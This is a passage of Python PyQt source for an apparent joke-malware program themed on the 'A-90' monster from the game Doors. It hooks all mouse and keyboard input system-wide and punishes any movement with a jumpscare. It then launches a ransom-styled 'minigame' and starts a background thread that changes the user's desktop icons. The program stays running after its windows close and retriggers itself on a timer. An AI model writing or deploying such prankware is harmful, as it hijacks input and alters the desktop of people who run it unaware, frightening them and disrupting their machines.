        self.background = QLabel(self)
        self.background.setGeometry(0, 0, self.width(), self.height())
        self.background.setAttribute(Qt.WA_TransparentForMouseEvents, True)
        self.background.hide()
        self.label = QLabel(self)
        self.label.setAttribute(Qt.WA_TranslucentBackground)
        self.label.setAttribute(Qt.WA_TransparentForMouseEvents, True)
        self.label.setStyleSheet('background: transparent; border: none;')
        self.label.hide()
        self.static_timer = QTimer(self)
        self.static_timer.timeout.connect(self.make_static)
        QTimer.singleShot(50, self.show_a90)

    def start_input_listener(self):
        if self.input_active:
            return
        else:
            self.input_active = True
            self.mouse_listener = mouse.Listener(on_move=self.on_mouse_move, on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
            self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
            self.mouse_listener.start()
            self.keyboard_listener.start()

    def stop_input_listener(self):
        self.input_active = False
        try:
            if self.mouse_listener:
                self.mouse_listener.stop()
        except Exception:
            pass
        try:
            if self.keyboard_listener:
                self.keyboard_listener.stop()
        except Exception:
            pass
        self.mouse_listener = None
        self.keyboard_listener = None

    def punish_input(self):
        global punish
        punish = True

    def on_mouse_move(self, x, y):
        if self.input_active:
            self.punish_input()

    def on_mouse_click(self, x, y, button, pressed):
        if self.input_active and pressed:
            self.punish_input()

    def on_mouse_scroll(self, x, y, dx, dy):
        if self.input_active:
            self.punish_input()

    def on_key_press(self, key):
        if self.input_active:
            self.punish_input()

    def make_static(self):
        width = 160
        height = 90
        image = QImage(width, height, QImage.Format_RGB32)
        for y in range(height):
            for x in range(width):
                noise = random.randint((-35), 35)
                r = max(0, min(255, 65 + noise))
                g = max(0, min(255, 2 + noise // 4))
                b = max(0, min(255, 2 + noise // 4))
                image.setPixelColor(x, y, QColor(r, g, b))
        image = image.scaled(self.width(), self.height(), Qt.IgnoreAspectRatio, Qt.FastTransformation)
        self.background.setPixmap(QPixmap.fromImage(image))

    def show_a90(self):
        if self.pixmap1.isNull():
            self.finish()
            return
        else:
            self.label.setPixmap(self.pixmap1)
            self.label.resize(self.pixmap1.size())
            x = random.randint(0, max(0, self.width() - self.pixmap1.width()))
            y = random.randint(0, max(0, self.height() - self.pixmap1.height()))
            self.label.move(x, y)
            self.label.show()
            self.label.raise_()
            QTimer.singleShot(random.randint(800, 1800), self.apply_static)

    def apply_static(self):
        sound_manager.play_effect('start.mp3')
        self.make_static()
        self.background.show()
        self.background.lower()
        self.center_image(self.pixmap1)
        self.static_timer.start(35)
        QTimer.singleShot(random.randint(250, 450), self.show_stop_sign)

    def show_stop_sign(self):
        if self.pixmap2.isNull():
            self.finish()
        else:
            self.label.setPixmap(self.pixmap2)
            self.label.resize(self.pixmap2.size())
            self.center_image(self.pixmap2)
            QTimer.singleShot(random.randint(100, 180), self.show_a90_again)

    def show_a90_again(self):
        self.static_timer.stop()
        self.background.hide()
        self.label.setPixmap(self.pixmap1)
        self.label.resize(self.pixmap1.size())
        self.center_image(self.pixmap1)
        QTimer.singleShot(random.randint(100, 180), self.show_red)

    def show_red(self):
        self.label.hide()
        self.background.setStyleSheet('background-color: rgb(90, 0, 0);')
        self.background.show()
        self.background.raise_()
        self.start_input_listener()
        QTimer.singleShot(random.randint(80, 150), self.finish)

    def center_image(self, pixmap):
        self.label.move((self.width() - pixmap.width()) // 2, (self.height() - pixmap.height()) // 2)

    def finish(self):
        global punish
        self.static_timer.stop()
        self.stop_input_listener()
        self.label.hide()
        self.background.hide()
        failed = punish
        if failed:
            punish = False
            event_controller.punishment_active = True
            sound_manager.play_effect('fail.mp3')
            self.jumpscare = JumpscareWindow('A-90_JUMPSCARE.png')
            self.jumpscare.show()
            self.jumpscare.raise_()
            self.jumpscare.activateWindow()
            QTimer.singleShot(50, self.wait_for_jumpscare)
        else:
            self.close()

    def wait_for_jumpscare(self):
        try:
            if hasattr(self, 'jumpscare') and self.jumpscare.isVisible():
                QTimer.singleShot(50, self.wait_for_jumpscare)
            else:
                self.start_ransom()
                self.close()
        except RuntimeError:
            return None

    def start_ransom(self):
        try:
            threading.Thread(
                target=_apply_icons_background,
                daemon=True
            ).start()
        except Exception as e:
            print(f'Failed to change desktop icons: {e}')
        sound_manager.play_music('da song.mp3')
        self.ransom_game = RansomMinigame()
        self.ransom_game.show()

    def closeEvent(self, event):
        self.static_timer.stop()
        self.stop_input_listener()
        event.accept()


class EventController:
    """EventController"""
    def __init__(self, app):
        self.app = app
        self.cooldown = False
        self.punishment_active = False
        self.overlay = None

    def trigger_event(self):
        if self.cooldown or self.punishment_active:
            return None
        else:
            self.cooldown = True
            self.overlay = FlashOverlay('A-90_IDLE.png', 'stop_sign.png')
            self.overlay.show()
            QTimer.singleShot(TRIGGER_COOLDOWN * 1000, self.end_cooldown)

    def end_cooldown(self):
        self.cooldown = False
        if not self.punishment_active:
            self.trigger_event()


app = QApplication(sys.argv)
_GLITCH_PIXMAP_CACHE = {}
for _p in GLITCH_IMAGES:
    _GLITCH_PIXMAP_CACHE[_p] = load_pixmap(_p)
app.setQuitOnLastWindowClosed(False)
sound_manager = SoundManager()
event_controller = EventController(app)
_ico = os.path.abspath(_persistent_icon_path())
_icon_backup = build_icon_backup(_ico)

QTimer.singleShot(1000, event_controller.trigger_event)
sys.exit(app.exec_())